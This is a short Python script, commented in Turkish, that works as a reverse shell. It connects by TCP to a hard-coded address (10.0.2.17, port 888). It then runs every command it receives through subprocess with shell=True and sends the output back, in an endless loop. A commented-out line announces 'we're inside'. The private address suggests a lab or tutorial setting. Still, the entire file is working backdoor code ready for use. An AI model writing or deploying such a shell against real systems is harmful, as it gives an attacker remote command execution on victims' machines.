import socket
import subprocess



def komut_isleme(komut):
    return subprocess.check_output(komut, shell=True)
   

baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       #AF_INET6   SOCK_STREAM(tcp)  SOCK_DGREAM(udp)

baglanti.connect(("10.0.2.17",888))      #ip adresimiz ve port numarası

#baglanti.send("tamamdir icerideyiz\n".encode("utf-8"))

while True:
    komut = baglanti.recv(1024).decode("utf-8")
    veri = komut_isleme(komut)
    baglanti.send(veri)


baglanti.close()



